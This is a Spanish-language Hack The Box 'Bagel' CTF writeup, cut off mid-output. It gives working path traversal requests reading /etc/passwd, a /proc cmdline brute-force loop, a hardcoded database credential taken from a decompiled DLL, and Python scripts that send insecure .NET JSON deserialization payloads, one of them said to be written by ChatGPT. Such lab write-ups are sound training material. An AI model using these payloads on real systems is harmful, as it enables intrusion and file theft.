+++
author = "Andrés Del Cerro"
title = "Hack The Box: Bagel Writeup | Medium"
date = "2024-12-17"
description = ""
tags = [
    "HackTheBox",
    "Bagel",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "HTTP Enumeration",
    "Directory Path Traversal",
    "Local File Inclusion",
    "Analyzing Python Source Code",
    "Brute-forcing PID's cmdline",
    "Decompiling .NET dll w/dotPeek",
    "Analyzing .NET Source Code",
    "Information Disclosure",
    "Insecure JSON Deserialization",
    "Credentials Reuse",
    "User Pivoting",
    "sudo dotnet permission"
]

+++

# Hack The Box: Bagel Writeup

Welcome to my detailed writeup of the medium difficulty machine **"Bagel"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```console
rustscan -a 10.129.228.247 --ulimit 5000 -g
10.129.228.247 -> [22,5000]
```

```console
nmap -p22,5000 -sCV 10.129.228.247 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 15:16 CET
Nmap scan report for 10.129.228.247
Host is up (0.037s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey:
|   256 6e:4e:13:41:f2:fe:d9:e0:f7:27:5b:ed:ed:cc:68:c2 (ECDSA)
|_  256 80:a7:cd:10:e7:2f:db:95:8b:86:9b:1b:20:65:2a:98 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Tue, 17 Dec 2024 14:17:09 GMT
|     Connection: close
|   HTTPOptions:
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Tue, 17 Dec 2024 14:17:24 GMT
|     Connection: close
|   Help, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Tue, 17 Dec 2024 14:17:34 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Tue, 17 Dec 2024 14:17:09 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (version).)</h1>
|   TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Tue, 17 Dec 2024 14:17:35 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|_    <h1>Bad Request (Invalid request line (parts).)</h1>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=12/17%Time=676187E3%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nServer:\x20Micro
SF:soft-NetCore/2\.0\r\nDate:\x20Tue,\x2017\x20Dec\x202024\x2014:17:09\x20
SF:GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,E8,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20Microso
SF:ft-NetCore/2\.0\r\nDate:\x20Tue,\x2017\x20Dec\x202024\x2014:17:09\x20GM
SF:T\r\nContent-Length:\x2054\r\nConnection:\x20close\r\nKeep-Alive:\x20tr
SF:ue\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(versi
SF:on\)\.\)</h1>")%r(HTTPOptions,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nServer:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Tue,\x2017\x20Dec\x20202
SF:4\x2014:17:24\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(Help,E6,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\
SF:x20Microsoft-NetCore/2\.0\r\nDate:\x20Tue,\x2017\x20Dec\x202024\x2014:1
SF:7:34\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\nKeep-Al
SF:ive:\x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\
SF:x20\(parts\)\.\)</h1>")%r(SSLSessionReq,E6,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-NetCore/2
SF:\.0\r\nDate:\x20Tue,\x2017\x20Dec\x202024\x2014:17:34\x20GMT\r\nContent
SF:-Length:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h
SF:1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>"
SF:)%r(TerminalServerCookie,E6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\r\nDate:\x2
SF:0Tue,\x2017\x20Dec\x202024\x2014:17:35\x20GMT\r\nContent-Length:\x2052\
SF:r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h1>Bad\x20Reques
SF:t\x20\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>")%r(TLSSessionR
SF:eq,E6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html
SF:\r\nServer:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Tue,\x2017\x20Dec\x20
SF:2024\x2014:17:35\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20clos
SF:e\r\nKeep-Alive:\x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20requ
SF:est\x20line\x20\(parts\)\.\)</h1>");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.31 seconds
```

# UDP Enumeration

```console
sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.228.247 -oN allPorts.UDP
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 15:16 CET
Nmap scan report for 10.129.228.247
Host is up (0.037s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
16739/udp closed unknown
17573/udp closed unknown
20851/udp closed unknown
29541/udp closed unknown
36778/udp closed unknown
51554/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.88 seconds
```

# HTTP Enumeration
La versión de OpenSSH no es vulnerable, por lo cual el vector de ataque tiene pinta de que debe de ser por HTTP.

Además, del escaneo inicial encontramos algo interesante, `Server: Microsoft-NetCore/2.0`, esto es un entorno de ejecución de ASP.NET que permite ejecutar aplicaciones web o de servidores, compatible con Linux. Por lo cual nos vamos a enfrentar a una aplicación .NET

`whatweb` no nos reporta nada interesante salvo que la raíz de la aplicación web nos reporta un código de error `400 Bad Request`.
```console
whatweb http://10.129.228.247:5000
http://10.129.228.247:5000 [400 Bad Request] Country[RESERVED][ZZ], HTTPServer[Microsoft-NetCore/2.0], IP[10.129.228.247]
```

Intentando fuzzear con `feroxbuster` me reporta un error de time-out.
```console
feroxbuster -u http://10.129.228.247:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.228.247:5000
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
Could not connect to http://10.129.228.247:5000, skipping...
  => error sending request for url (http://10.129.228.247:5000/): operation timed out
```

Escaneando otra vez con `rustscan` vemos que también existe el puerto 8000 abierto, menos mal que me di cuenta temprano de esto antes de comerme la cabeza.
```console
rustscan -a 10.129.228.247 --ulimit 5000 -g
10.129.228.247 -> [5000,8000,22]
```

`nmap` nos reporta cosas interesantes, como parecía, es otra aplicación web pero esta vez de Flask y además encontramos el dominio `bagel.htb`, lo añadimos al `/etc/hosts`.
```console
nmap -p8000 -sCV 10.129.228.247
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 15:26 CET
Nmap scan report for 10.129.228.247
Host is up (0.036s latency).

PORT     STATE SERVICE  VERSION
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Tue, 17 Dec 2024 14:26:56 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Tue, 17 Dec 2024 14:26:51 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 263
|     Location: http://bagel.htb:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.
|   Socks5:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=12/17%Time=67618A29%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,1EA,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.2
SF:\.2\x20Python/3\.10\.9\r\nDate:\x20Tue,\x2017\x20Dec\x202024\x2014:26:5
SF:1\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Len
SF:gth:\x20263\r\nLocation:\x20http://bagel\.htb:8000/\?page=index\.html\r
SF:\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<t
SF:itle>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20s
SF:hould\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20UR
SF:L:\x20<a\x20href=\"http://bagel\.htb:8000/\?page=index\.html\">http://b
SF:agel\.htb:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click\x20the\x
SF:20link\.\n")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\
SF:r\nServer:\x20Werkzeug/2\.2\.2\x20Python/3\.10\.9\r\nDate:\x20Tue,\x201
SF:7\x20Dec\x202024\x2014:26:56\x20GMT\r\nContent-Type:\x20text/html;\x20c
SF:harset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<
SF:!doctype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title
SF:>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20f
SF:ound\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20
SF:manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\
SF:.</p>\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x2
SF:0HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\
SF:.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=
SF:\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Er
SF:ror\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body
SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\\x05\\x04
SF:\\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST
SF:\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\
SF:n\x20\x20\x20\x20</body>\n</html>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.00 seconds
```

Este es el sitio web.
![Write-up Image](images/Screenshot_1.png)

## Directory Path Traversal -> Local File Inclusion
Como podemos ver el parámetro `page` pinta turbio, ya que se le está pasando un archivo directamente, podemos comprobar si es vulnerable a Path Traversal y vemos que si, muy básico todo por ahora.

```console
curl http://bagel.htb:8000/\?page\=../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:994:992::/var/lib/chrony:/sbin/nologin
dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
systemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin
systemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
_laurel:x:987:987::/var/log/laurel:/bin/false
```

Como es una aplicación Flask podríamos intentar conseguir unos archivos del sistema mediante Path Traversal para poder conseguir generar el código de la consola de Werkzeug pero podemos ver que está deshabilitada.
![Write-up Image](images/Screenshot_2.png)

## Dumping source code
Como es normal, las aplicaciones web de python tiene un archivo `app.py` como script central para iniciar la aplicación, vamos a leer el código para ver que está pasando, este archivo se encuentra en `../app.py`.
```python
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
```

El endpoint `/orders` establece una conexión a través de WebSocket con la aplicación que está en el puerto 5000, luego envía un mensaje en formato JSON con la intención de leer un archivo `orders.txt`

Podemos intentar cargar el archivo `orders.txt` pero después de un rato, vemos que el servidor nos responde con la cadena `test`
```console
import websocket,json

ws = websocket.WebSocket()
ws.connect("ws://bagel.htb:5000/") # connect to order app
order = {"ReadOrder":"orders.txt"}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(json.loads(result)['ReadOrder'])
```

```console
python3 exploit.py
test
```

## Brute-forcing PID's cmdline
Podríamos intentar recuperar el `.dll` o el `.exe` del servidor WebSocket a través del Path Traversal e intentar descompilarlo para ver si se oculta información privilegiada pero por ahora no tengo ni idea de donde se encuentra el archivo `.dll` que queremos recuperar.

Como tenemos un LFI y el WebSocket está activo y según el código parece que se debe de ejecutar manualmente, de ahí el recordatorio de abrir el WS en forma de comentario que nos hemos encontrado podemos hacer una cosa.

En linux, en `/proc` se incluye un directorio por cada proceso que está en ejecución, los directorios son `/proc/PID` siendo PID el número del proceso. Dentro de este directorio existe un fichero que contiene información sobre el comando original que ejecutó el proceso llamado `cmdline`, por lo que quizás podemos recuperar el comando con el que se ejecutó el servidor WebSocket y si se ha utilizado rutas absolutas podríamos saber cual es el archivo que nos interesa para descompilarlo.

Con un bucle for y `grep` podemos iterar hasta un número elevado ya que los PID en linux suelen ser números altos y encontramos algo interesante.
```console
for i in {1..80000}; do curl -s http://bagel.htb:8000/\?page\=../../../../../../../../../proc/$i/cmdline --output - | grep -v "File not found" --binary-files=text && echo "  -> PID: $i"; done
/usr/lib/systemd/systemdrhgb--switched-root--system--deserialize35
  -> PID: 1
/usr/lib/systemd/systemd-journald
  -> PID: 760
/usr/lib/systemd/systemd-udevd
  -> PID: 774
/usr/lib/systemd/systemd-oomd
  -> PID: 852
/usr/lib/systemd/systemd-resolved
  -> PID: 854
/usr/lib/systemd/systemd-userdbd
  -> PID: 855
/sbin/auditd
  -> PID: 856
/sbin/auditd
  -> PID: 857
/usr/sbin/sedispatch
  -> PID: 858
/usr/local/sbin/laurel--config/etc/laurel/config.toml
  -> PID: 859
/sbin/auditd
  -> PID: 860
/usr/sbin/NetworkManager--no-daemon
  -> PID: 888
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
  -> PID: 892
python3/home/developer/app/app.py
  -> PID: 894
/usr/sbin/irqbalance--foreground
  -> PID: 895
/usr/lib/polkit-1/polkitd--no-debug
  -> PID: 897
/usr/sbin/rsyslogd-n
  -> PID: 898
/usr/sbin/rsyslogd-n
  -> PID: 900
/usr/lib/systemd/systemd-logind
  -> PID: 901
/usr/bin/VGAuthService-s
  -> PID: 902
/usr/bin/vmtoolsd
  -> PID: 903
/usr/sbin/abrtd-d-s
  -> PID: 904
/usr/sbin/chronyd-F2
  -> PID: 906
/usr/bin/dbus-broker-launch--scopesystem--audit
  -> PID: 907
/usr/sbin/rsyslogd-n
  -> PID: 915
dbus-broker--log4--controller9--machine-idce8a2667e5384602a9b46d6ad7614e92--max-bytes536870912--max-fds4096--max-matches131072--audit
  -> PID: 916
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
  -> PID: 921
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
  -> PID: 922
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
  -> PID: 923
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
  -> PID: 924
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
  -> PID: 925
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
  -> PID: 926
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
  -> PID: 927
```

## Decompiling .NET dll w/dotPeek
El comando utilizado para ejecutar el proceso del WebSocket ha sido:
```console
dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll
```

Ahora podemos descargarnos este `.dll`
```console
wget http://bagel.htb:8000/\?page\=../../../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll
--2024-12-17 16:09:06--  http://bagel.htb:8000/?page=../../../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll
Resolving bagel.htb (bagel.htb)... 10.129.228.247
Connecting to bagel.htb (bagel.htb)|10.129.228.247|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10752 (10K) [application/octet-stream]
Saving to: ‘index.html?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fbagel%2Fbin%2FDebug%2Fnet6.0%2Fbagel.dll’

index.html?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fop 100%[======================================================================================================================================>]  10.50K  --.-KB/s    in 0s

2024-12-17 16:09:06 (28.8 MB/s) - ‘index.html?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fbagel%2Fbin%2FDebug%2Fnet6.0%2Fbagel.dll’ saved [10752/10752]
```

Lo renombramos.
```console
mv index.html\?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fbagel%2Fbin%2FDebug%2Fnet6.0%2Fbagel.dll bagel.dll
```

Ahora podemos comprobar que efectivamente este es un archivo `.dll` que utiliza .NET.
```console
file bagel.dll
bagel.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

Esto significa que podemos utilizar `dotPeek` para descompilar el DLL y ver que contiene.

Nos podemos compartir el DLL a nuestra máquina con `impacket-smbserver`, una vez abierto en `dotPeek` podemos leer el código fuente de la aplicación.
![Write-up Image](images/Screenshot_3.png)

## Information Disclosure
En la clase `DB` y en el método `DB_connection()` encontramos una línea que realiza una conexión Sql donde está hardcodeada unas credenciales.

```
dev:k8wdAYYKyhnjg3K
```

![Write-up Image](images/Screenshot_4.png)

Quizás son las credenciales de los usuarios `developer` o `phil` pero no podemos conectarnos por SSH ya que solo se permite autenticación por par de claves.
```console
ssh developer@bagel.htb
developer@bagel.htb: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
```

## Insecure JSON Deserialization
Analizando el código encontramos la clase `Handler` que contiene métodos relacionados con la serialización y deserialización de objetos.
```c#
public class Handler
  {
    public object Serialize(object obj)
    {
      return (object) JsonConvert.SerializeObject(obj, (Formatting) 1, new JsonSerializerSettings()
      {
        TypeNameHandling = (TypeNameHandling) 4
      });
    }

    public object Deserialize(string json)
    {
      try
      {
        return (object) JsonConvert.DeserializeObject<Base>(json, new JsonSerializerSettings()
        {
          TypeNameHandling = (TypeNameHandling) 4
        });
      }
      catch
      {
        return (object) "{\"Message\":\"unknown\"}";
      }
    }
  }
```

Este método es vulnerable a un ataque de deserialización ya que se utiliza la opción `TypeNameHandling.All` en `JsonConvert.DeserializeObject` y además el input del usuario no es filtrado en ningún momento.

### Por qué es peligroso `TypeNameHandling.All`?

- La opción **`TypeNameHandling.All`** permite que el deserializador **interprete y ejecute tipos específicos** incluidos en los datos JSON recibidos.
- Esto significa que si un atacante puede controlar el JSON de entrada, puede incluir un **assembly** o un tipo arbitrario y ejecutar código malicioso durante el proceso de deserialización.

En Linux, podemos usar clases estándar como `System.Diagnostics.Process` para ejecutar comandos del sistema.

Vamos a intentar ejecutar un comando a nivel de sistema para mandarnos un ping, este payload está generado por ChatGPT.

```json
{
  "$type": "System.Diagnostics.Process, System.Diagnostics.Process",
  "StartInfo": {
    "FileName": "/bin/bash",
    "Arguments": "-c 'ping -c 4 <IP_ATACANTE>'"
  }
}
```

Lo que mas me interesa de este payload es el valor de `$type`
- **Valor:** `"System.Diagnostics.Process, System.Diagnostics.Process"`
- Este campo especifica el **tipo** de objeto que se está deserializando. El formato es `"Namespace.Clase, Assembly"`. En este caso, el tipo que se está deserializando es `System.Diagnostics.Process`, que se utiliza para iniciar y gestionar procesos del sistema operativo.
- La clave `"$type"` es crucial para permitir la **deserialización polimórfica** y la ejecución de código arbitrario. En este caso, especificamos que el objeto deserializado debe ser de tipo `Process`.

Escribiendo un simple script en python...
```console
import websocket

url = "ws://bagel.htb:5000/"

# Payload JSON malicioso
payload = '''
{
  "$type": "System.Diagnostics.Process, System.Diagnostics.Process",
  "StartInfo": {
    "FileName": "/bin/bash",
    "Arguments": "-c 'ping -c 4 10.10.14.197'"
  }
}
'''

ws = websocket.WebSocket()
ws.connect(url)

print("[*] Enviando payload malicioso...")
ws.send(payload)

response = ws.recv()
print("[*] Respuesta del servidor:", response)

ws.close()
```

Al ejecutarlo nos devuelve lo siguiente:
```console
python3 exploit.py
[*] Enviando payload malicioso...
[*] Respuesta del servidor: "{\"Message\":\"unknown\"}"
```

Esto significa que la solicitud ha generado una excepción en el método, por lo cual nos ha devuelto ese mensaje.
![Write-up Image](images/Screenshot_5.png)

### `Abusing File.ReadFile` + `Orders.RemoveOrder` with the Deserialization Vulnerability to read `phil` private key
Quizás no funciona ya que la biblioteca `System.Diagnostics` no está disponible en el servidor Linux o el ensamblado `System.Diagnostics.Process` está bloqueado.

Por lo cual podemos intentar usar otras bibliotecas, o los tipos específicos en el código que hemos encontrado como por ejemplo la clase `File`.

En esta clase tenemos el método `ReadFile` con el cual podemos leer un archivo.
```c#

    public string ReadFile
    {
      set
      {
        this.filename = value;
        this.ReadContent(this.directory + this.filename);
      }
      get => this.file_content;
    }
```

Ahora, podemos ver que la clase `Orders` tiene una instancia de `File`
![Write-up Image](images/Screenshot_6.png)

El problema es que el método `ReadOrder` contiene una sanitización para evitar el Path Traversal, por lo cual vamos a aprovechar la deserialización que se puede realizar y el método `RemoveOrder` que no contiene esta sanitización y como podéis ver en el código no se define los getter ni los setter, por lo cual directamente se guarda el valor que se le pasa y se retorna cuando se lee, esto nos viene perfecto para poder leer un archivo del sistema.

```c#
public class Orders
  {
    private string order_filename;
    private string order_info;
    private File file = new File();

    [field: DebuggerBrowsable]
    public object RemoveOrder { get; set; }

    public string WriteOrder
    {
      get => this.file.WriteFile;
      set
      {
        this.order_info = value;
        this.file.WriteFile = this.order_info;
      }
    }

    public string ReadOrder
    {
      get => this.file.ReadFile;
      set
      {
        this.order_filename = value;
        this.order_filename = this.order_filename.Replace("/", "");
        this.order_filename = this.order_filename.Replace("..", "");
        this.file.ReadFile = this.order_filename;
      }
    }
  }
```

Entonces juntando todo, deberíamos de ser capaz de crear un objeto `RemoveOrder` pasando como argumento un objeto de tipo File con el `ReadFile` setteado con el archivo que queremos leer.

Entonces, modificando el payload que anteriormente nos ha dado ChatGPT y leyendo [la documentación oficial](https://www.newtonsoft.com/json/help/html/serializetypenamehandling.htm) , el payload se queda en lo siguiente:
```json
{
    "RemoveOrder": {
        "$type": "bagel_server.File, bagel",
        "ReadFile": "../../../../../../../../etc/passwd"
    }
}
```

Entonces, con el siguiente script en python, podemos enviar el payload que queremos.
```python
import websocket

url = "ws://bagel.htb:5000/"

payload = '''
{
    "RemoveOrder": {
        "$type": "bagel_server.File, bagel",
        "ReadFile": "../../../../../../../../etc/passwd"
    }
}
'''

ws = websocket.WebSocket()
ws.connect(url)

print("[*] Enviando payload malicioso...")
ws.send(payload)

response = ws.recv()
print("[*] Respuesta del servidor:", response)

ws.close()
```

Y vemos que efectivamente, podemos leer el archivo que queramos.
```console
python3 exploit.py
[*] Enviando payload malicioso...
[*] Respuesta del servidor: {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "6:11:40",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
